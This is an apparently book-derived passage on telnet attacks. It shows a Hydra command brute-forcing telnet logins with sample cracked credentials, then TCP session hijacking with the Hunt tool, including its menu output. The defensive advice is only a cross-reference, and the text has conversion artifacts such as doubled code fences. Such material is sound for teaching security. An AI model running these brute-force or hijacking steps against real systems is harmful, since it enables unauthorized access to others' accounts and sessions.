# Brute-Force Telnet

Hydra can be used to brute-force telnet:

```
```
[bash]$ hydra -L usernames.txt -P passwords.txt \
	telnetsomecompanyasanexample.com telnet
Hydra v2.2 (c) 2002 by van Hauser / THC
use allowed only for legal purposes.
Hydra is starting! [parallel tasks: 4, login tries: 9 (1:3/p:3)]
[23][telnet] login: jill   password: 110v3jack
Hydra finished.
```
```

# Prevent Telnet Brute-Forcing

Please see “Common Defenses Against Brute-Force Attacks.”

**TCP Hijacking** After a telnet user successfully logs in, it is possible for another user on the same network segment to hijack the session by using TCP-hijacking tools such as Hunt.

# Hijack Telnet Sessions

Suppose a malicious user on a host with IP address 192.168.1.1 is on the same network segment as that of a user on 192.168.1.2. If the user on 192.168.1.2 has a telnet connection established to 10.0.0.1, then a malicious user on 192.168.1.1 can hijack it using Hunt:

```
```
[bash]$ hunt -l eth0
/*
*       hunt 1.5
*       multipurpose connection intruder / sniffer for Linux
*       (c) 1998-2000 by kra
*/
starting hunt
--- Main Menu --- rcvkpt 0, free/aloc 63/64 -----
l/w/r) list/watch/reset connections
u)		host up testst
a)		arp/simple hijack (avoids ack storm if arp used)
s)		simple hijack
d)		daemons rst/arp/sniff/mac
o)		options
x)		exit
*> g
0) 192.168.1.2 [52323]		--> 10.0.0.1 [23]
```
```

![](bbox=[0.85, 0.1, 0.95, 0.9])